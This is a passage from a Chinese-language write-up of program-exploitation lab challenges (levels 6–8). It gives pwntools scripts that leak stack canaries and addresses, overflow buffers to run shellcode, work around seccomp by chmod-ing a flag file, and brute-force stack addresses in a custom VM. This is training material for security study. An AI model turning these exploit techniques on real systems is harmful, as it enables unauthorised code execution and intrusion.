class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>使用 <code>seccomp_rule_add</code>限制了系统调用，由于限制系统调用后代码使用了 <code>puts</code>函数，所以为了保证程序正常运行到返回，必须要保证 <code>write</code>系统调用正常使用。</p><p>在代码中我们只能保证两个系统调用可以正常使用。<code>write</code>占用了其中一个，所以我们只能使用 <code>chmod</code>系统调用更改flag文件的权限，然后读取flag中的内容。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;&#x2F;flag&#39;, 0    mode equ 0x1a4 ; 十六进制的644  ---注意这里的传参 不能直接写644，那是十进制数，之前一直写0644也不对，他好像不能直接识别为八进制section .textglobal _start_start:    mov rax, 90    lea rdi, [rel filename]    mov rsi, mode    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x68</span>  <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x70</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xD0</span> <span class="token operator">-</span> <span class="token number">0xD0</span> <span class="token operator">-</span> <span class="token number">0x70</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">0x70</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level6/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment"># real_payload = shellcode + 46 * b'a' + p32(1) + p32(0x5A) + 12*b'A'  + canary_value +  8*b'C'+ return_address</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x5A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token operator">*</span><span class="token string">b'A'</span>  <span class="token operator">+</span> canary_value <span class="token operator">+</span>  <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'C'</span><span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""    mov rax, 90    lea rdi, [rel filename]    mov rsi, mode    syscall    push 0x66    mov rdi, rsp    push 4    pop rsi    push 0x5A    pop rax    syscall    times 10 nop"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x68</span>  <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x80</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xE0</span> <span class="token operator">-</span> <span class="token number">0xE0</span> <span class="token operator">-</span> <span class="token number">0x80</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level6/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span>  <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'C'</span><span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这一关增加了虚拟架构。我们首先要寻找溢出点，发现在执行 <code>SYS</code>系统调用的 <code>write</code>调用时，我们可以从 <code>0x300 + 0x FF</code>开始，这样就可以溢出到保留的返回地址 <code>ret</code>。然后我们在将返回地址填充为栈空间的地址，这样就可以跳转到栈空间中执行shellcode。</p><p>但是在这一关中，没办法找到准确的 <code>buf</code>的栈地址，因为保留的栈帧不知道为什么变成0了。所以我们需要使用 <code>cat /proc/pid/maps</code>查看对应进程的stack空间起始地址，至于 <code>buf</code>的首地址，可以通过遍历来解决，注意step为 <code>0x08</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-exploitation~level7-0:~$ <span class="token function">cat</span> /proc/4218/maps00400000-00404000 r-xp 00000000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.000405000-00406000 r-xp 00004000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.000406000-00407000 rwxp 00005000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.000407000-00428000 rwxp 00000000 00:00 <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7ffff7dce000-7ffff7df0000 r-xp 00000000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so7ffff7df0000-7ffff7f68000 r-xp 00022000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so7ffff7f68000-7ffff7fb6000 r-xp 0019a000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so7ffff7fb6000-7ffff7fba000 r-xp 001e7000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so7ffff7fba000-7ffff7fbc000 rwxp 001eb000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so7ffff7fbc000-7ffff7fc2000 rwxp 00000000 00:00 <span class="token number">0</span> 7ffff7fcb000-7ffff7fce000 r--p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7ffff7fce000-7ffff7fcf000 r-xp 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>7ffff7fcf000-7ffff7fd0000 r-xp 00000000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so7ffff7fd0000-7ffff7ff3000 r-xp 00001000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so7ffff7ff3000-7ffff7ffb000 r-xp 00024000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so7ffff7ffc000-7ffff7ffd000 r-xp 0002c000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so7ffff7ffd000-7ffff7ffe000 rwxp 0002d000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so7ffff7ffe000-7ffff7fff000 rwxp 00000000 00:00 <span class="token number">0</span> 7ffffffde000-7ffffffff000 rwxp 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>ffffffffff600000-ffffffffff601000 <span class="token parameter variable">--xp</span> 00000000 00:00 <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.1"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""op arg1(value) arg2(register)SYS \x40            exit --0x10   read 0x08IMM \x08     a 1b 8c 4"""</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> stack_address <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7ffffffde000</span><span class="token punctuation">,</span> <span class="token number">0x7ffffffff000</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stack_address<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.1"</span><span class="token punctuation">)</span>    data_list <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">b'\x08\x00\x01'</span> <span class="token comment"># IMM a= \x00</span>        <span class="token string">b'\x08\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>        <span class="token string">b'\x08\x21\x04'</span> <span class="token comment"># IMM c = \x21</span>        <span class="token string">b'\x40\x01\x04'</span> <span class="token comment"># read  返回值是a</span>        <span class="token string">b'\x08\xFF\x02'</span> <span class="token comment"># IMM i = \xFF</span>    <span class="token punctuation">]</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[+] Starting interpreter loop! Good luck!\n"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_address <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.0"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""STM \x80         SYS \x02            exit --0x10   read 0x04IMM \x40     a 4b 8c 1"""</span>stack_address <span class="token operator">=</span> <span class="token number">1</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> stack_address <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7ffffffde000</span><span class="token punctuation">,</span> <span class="token number">0x7ffffffff000</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stack_address<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.0"</span><span class="token punctuation">)</span>    data_list <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">b'\x04\x40\x00'</span> <span class="token comment"># IMM a= \x00</span>        <span class="token string">b'\x08\x40\xFF'</span> <span class="token comment"># IMM b = \xFF</span>        <span class="token string">b'\x01\x40\x21'</span> <span class="token comment"># IMM c = \x21</span>        <span class="token string">b'\x04\x02\x04'</span> <span class="token comment"># read  返回值是a</span>        <span class="token string">b'\x20\x40\xFF'</span> <span class="token comment"># IMM i = \xFF</span>    <span class="token punctuation">]</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Good luck!"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[s] ... read_memory\n"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_address <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>第8关跟第7关一样，但开启了canary和ASLR。所以不能采用爆破的思路解决了。观察栈空间发现 <code>rsp+0x0000</code>处的内容刚好和main函数的栈基址相差 <code>0xF8</code>，但我们只能显示处 <code>&amp;buf+0x300</code>之后的字节内容，无法显示之前的内容。所以只能再想办法看看返回地址后是否有其他的地址可以泄露。</p><p>果然，在 <code>main函数返回地址处 + 8个偏移量</code>发现了和 <code>rsp+0x0000</code>处一样的内容。<code>rsp+0x0000</code>处的参数意义是 <code>main函数argv参数的地址</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+---------------------------------+-------------------------+--------------------+<span class="token operator">|</span>                  Stack location <span class="token operator">|</span>            Data <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> <span class="token operator">|</span>      Data <span class="token punctuation">(</span>LE int<span class="token punctuation">)</span> <span class="token operator">|</span>+---------------------------------+-------------------------+--------------------+<span class="token operator">|</span> 0x00007ffd2a17a3c0 <span class="token punctuation">(</span>rsp+0x0000<span class="token punctuation">)</span> <span class="token operator">|</span> d8 a8 <span class="token number">17</span> 2a fd 7f 00 00 <span class="token operator">|</span> 0x00007ffd2a17a8d8 <span class="token operator">|</span><span class="token operator">|</span> 0x00007ffd2a17a3c8 <span class="token punctuation">(</span>rsp+0x0008<span class="token punctuation">)</span> <span class="token operator">|</span> b8 <span class="token number">59</span> 5b 5b 01 00 00 00 <span class="token operator">|</span> 0x000000015b5b59b8 <span class="token operator">|</span><span class="token operator">|</span> 0x00007ffd2a17a3d0 <span class="token punctuation">(</span>rsp+0x0010<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">31</span> 0a 00 00 00 00 00 00 <span class="token operator">|</span> 0x0000000000000a31 <span class="token operator">|</span>  <span class="token operator">&lt;</span>---- 这里是buf的起始地址<span class="token operator">|</span> 0x00007ffd2a17a3d8 <span class="token punctuation">(</span>rsp+0x0018<span class="token punctuation">)</span> <span class="token operator">|</span> 00 00 00 00 00 00 00 00 <span class="token operator">|</span> 0x0000000000000000 <span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.1"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""op arg1 arg2-------op vaules registerSYS \x08         